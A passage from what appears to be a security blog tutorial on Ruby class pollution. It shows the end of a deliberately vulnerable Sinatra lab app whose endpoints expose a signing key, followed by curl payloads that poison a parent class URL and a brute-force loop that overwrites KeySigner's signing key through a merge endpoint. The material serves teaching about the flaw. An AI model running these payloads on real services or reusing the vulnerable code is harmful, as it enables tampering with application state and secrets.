+  <span class="c1"># curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"url":"http://example.com"}}}' http://localhost:4567/merge</span>
+
+  <span class="c1"># GET /sign_with_subclass_key - Signs data using the signing key stored in KeySigner</span>
+  <span class="n">get</span> <span class="s1">'/sign_with_subclass_key'</span> <span class="k">do</span>
+    <span class="n">content_type</span> <span class="ss">:json</span>
+
+    <span class="c1"># This gadget signs data using the signing key stored in KeySigner class</span>
+    <span class="n">signer</span> <span class="o">=</span> <span class="no">KeySigner</span><span class="p">.</span><span class="nf">new</span>
+    <span class="n">signed_data</span> <span class="o">=</span> <span class="n">signer</span><span class="p">.</span><span class="nf">sign</span><span class="p">(</span><span class="no">KeySigner</span><span class="p">.</span><span class="nf">signing_key</span><span class="p">,</span> <span class="s2">"data-to-sign"</span><span class="p">)</span>
+
+    <span class="p">{</span> <span class="ss">status: </span><span class="s1">'Data signed'</span><span class="p">,</span> <span class="ss">signing_key: </span><span class="no">KeySigner</span><span class="p">.</span><span class="nf">signing_key</span><span class="p">,</span> <span class="ss">signed_data: </span><span class="n">signed_data</span> <span class="p">}.</span><span class="nf">to_json</span>
+  <span class="k">end</span>
+
+  <span class="c1"># Curl command to infect KeySigner signing key (run in a loop until successful):</span>
+  <span class="c1"># for i in {1..1000}; do curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"superclass":{"subclasses":{"sample":{"signing_key":"injected-signing-key"}}}}}}' http://localhost:4567/merge; done</span>
+
+  <span class="c1"># GET /check-infected-vars - Check if all variables have been infected</span>
+  <span class="n">get</span> <span class="s1">'/check-infected-vars'</span> <span class="k">do</span>
+    <span class="n">content_type</span> <span class="ss">:json</span>
+
+    <span class="p">{</span>
+      <span class="ss">user_url: </span><span class="no">Person</span><span class="p">.</span><span class="nf">url</span><span class="p">,</span>
+      <span class="ss">signing_key: </span><span class="no">KeySigner</span><span class="p">.</span><span class="nf">signing_key</span>
+    <span class="p">}.</span><span class="nf">to_json</span>
+  <span class="k">end</span>
+
+  <span class="n">run!</span> <span class="k">if</span> <span class="n">app_file</span> <span class="o">==</span> <span class="vg">$0</span>
+<span class="k">end</span>
+</code></pre></div></div> <h3 id="poison-parent-class">Poison Parent Class</h3> <p>With this payload:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-d</span> <span class="s1">'{"class":{"superclass":{"url":"http://malicious.com"}}}'</span> http://localhost:4567/merge
+</code></pre></div></div> <p>It’s possible to modify the value of the <strong><code class="language-plaintext highlighter-rouge">@@url</code></strong> attribute of the parent class <strong><code class="language-plaintext highlighter-rouge">Person</code></strong>.</p> <h3 id="poisoning-other-classes"><strong>Poisoning Other Classes</strong></h3> <p>With this payload:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..1000<span class="o">}</span><span class="p">;</span> <span class="k">do </span>curl <span class="nt">-X</span> POST <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-d</span> <span class="s1">'{"class":{"superclass":{"superclass":{"subclasses":{"sample":{"signing_key":"injected-signing-key"}}}}}}'</span> http://localhost:4567/merge <span class="nt">--silent</span> <span class="o">&gt;</span> /dev/null<span class="p">;</span> <span class="k">done</span>
+</code></pre></div></div> <p>It’s possible to brute-force the defined classes and at some point poison the class <strong><code class="language-plaintext highlighter-rouge">KeySigner</code></strong> modifying the value of <code class="language-plaintext highlighter-rouge">signing_key</code> by <code class="language-plaintext highlighter-rouge">injected-signing-key</code>.\</p> <h2 id="references">References</h2> <ul> <li><a href="https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html">https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html</a></li> </ul> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> &copy; Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>
